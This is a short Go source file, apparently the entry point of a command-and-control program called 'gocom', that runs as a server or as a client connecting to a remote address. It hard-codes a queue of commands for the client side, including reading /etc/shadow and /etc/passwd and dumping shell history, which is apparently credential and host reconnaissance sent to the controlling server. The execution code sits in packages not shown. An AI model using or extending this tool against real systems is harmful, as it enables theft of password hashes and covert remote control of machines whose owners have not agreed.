package main

import (
	"flag"
	"log"

	"github.com/quietjoy/gocom/pkg/models"
	"github.com/quietjoy/gocom/pkg/modes"
)

func initializeCommandQueue() []models.ControlCommand {
	return []models.ControlCommand{
		{
			Command:   "cat",
			Arguments: "/etc/shadow",
		},
		{
			Command:   "cat",
			Arguments: "/etc/passwd",
		},
		{
			Command:   "cat",
			Arguments: "/etc/hosts",
		},
		{
			Command:   "cat",
			Arguments: "/etc/hostname",
		},
		{
			Command:   "history",
			Arguments: "",
		},
	}
}

func main() {
	mode := flag.String("mode", "", "[server/client] Determines mode program is run in")
	serverConnection := flag.String("remote", "", "[address:port] server and port to connect to. Only used if running in client mode")

	flag.Parse()

	switch *mode {
	case "server":
		log.Println("Running in server mode")
		modes.RunServer()
	case "client":
		log.Println("Running in client mode")
		modes.RunClient(serverConnection)
	default:
		log.Println("Invalid mode")
		panic("Invalid mode")
	}
}
